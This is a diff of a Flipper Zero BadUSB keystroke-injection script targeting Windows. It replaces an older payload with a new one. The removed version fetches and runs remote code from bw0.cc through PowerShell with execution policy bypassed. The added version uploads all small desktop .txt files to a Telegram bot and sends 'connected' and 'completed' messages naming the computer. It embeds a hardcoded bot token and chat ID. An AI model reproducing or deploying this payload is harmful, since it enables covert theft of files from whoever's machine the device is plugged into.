@@ -1,19 +1,26 @@
+REM Telegram File Collector for Flipper Zero
+REM Author: RFX
+REM Target: Windows 10/11
+REM Delay: 4000ms
 
-REM Title: beigeworm's Exfiltrate files to Telegram
-REM Author: @beigeworm
-REM Description: This script searches the users folder fot pictures, documents, logs, PDFs and more, then sends its all to a dropbox account.
-REM Target: Windows 10
-
-REM *SETUP*
-REM replace TELEGRAM_TOKEN with your Telegram Token.
-
-REM some setup for dukie script
-DEFAULT_DELAY 100
-
-REM open powershell (remove -W Hidden to show the window)
-DELAY 1000
+DELAY 4000
 GUI r
-DELAY 750
-STRING powershell -Ep Bypass -C $tg='TELEGRAM_TOKEN'; iex (irm bw0.cc/extg)
+DELAY 800
+STRING cmd
+DELAY 400
 ENTER
+DELAY 1500
 
+STRING powershell -c "$bot='8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI';$chat='6614794141';$url='https://api.telegram.org/bot'+$bot+'/sendMessage?chat_id='+$chat+'&text=Connected_from_'+$env:COMPUTERNAME;curl $url"
+DELAY 500
+ENTER
+DELAY 2000
+
+STRING powershell -c "$bot='8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI';$chat='6614794141';$desktop=[Environment]::GetFolderPath('Desktop');if(Test-Path $desktop){$files=Get-ChildItem $desktop -Filter '*.txt' -File -ErrorAction 0;if($files){foreach($f in $files){if($f.Length -lt 5000000){$url='https://api.telegram.org/bot'+$bot+'/sendDocument';curl -F 'chat_id='+$chat -F 'document=@'+$f.FullName $url;Start-Sleep -Milliseconds 1000}}}}"
+DELAY 500
+ENTER
+DELAY 2000
+
+STRING powershell -c "$bot='8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI';$chat='6614794141';$url='https://api.telegram.org/bot'+$bot+'/sendMessage?chat_id='+$chat+'&text=Completed_on_'+$env:COMPUTERNAME;curl $url"
+DELAY 500
+ENTER
